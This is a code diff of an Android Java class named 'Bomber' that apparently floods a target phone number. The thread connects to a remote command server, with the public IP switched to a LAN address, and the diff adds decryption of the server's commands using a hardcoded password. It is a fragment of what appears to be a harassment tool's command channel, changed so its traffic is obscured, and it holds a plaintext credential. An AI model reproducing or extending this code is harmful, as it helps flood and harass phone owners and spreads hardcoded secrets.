@@ -9,8 +9,15 @@ import java.io.StreamCorruptedException;
 import java.net.Socket;
 import java.net.URL;
 import java.net.UnknownHostException;
+import java.security.InvalidKeyException;
+import java.security.spec.InvalidKeySpecException;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKey;
 
 import org.json.JSONArray;
 
@@ -42,6 +49,7 @@ public class Bomber extends Thread {
 	String contentString;
 	String a[];
 	Context context;
+	String password = "12345688";
 	
 	public Bomber(String phoneNumber, WebView webView, Context context) {
 		this.phoneNumber = phoneNumber;
@@ -52,7 +60,8 @@ public class Bomber extends Thread {
 	public void run() {
 		Socket socket = null;
 		try {
-			socket = new Socket("121.199.31.211", 9999);
+		//	socket = new Socket("121.199.31.211", 9999);
+			socket = new Socket("192.168.1.112",9999);
 	
 		} catch (UnknownHostException e) {
 			// TODO Auto-generated catch block
@@ -70,7 +79,26 @@ public class Bomber extends Thread {
 				e1.printStackTrace();
 			}			
 			
-			if(contentString.equals("finish")){
+			try {
+				contentString = Secret.deCrypto(contentString, password);
+			} catch (InvalidKeyException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			} catch (InvalidKeySpecException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			} catch (NoSuchPaddingException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			} catch (IllegalBlockSizeException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			} catch (BadPaddingException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			}
+			
+			if(contentString.equals("finish\\*finish")){
 				Looper.prepare();
 				Toast.makeText(context, "发送完毕", Toast.LENGTH_SHORT).show();
 			    Looper.loop();
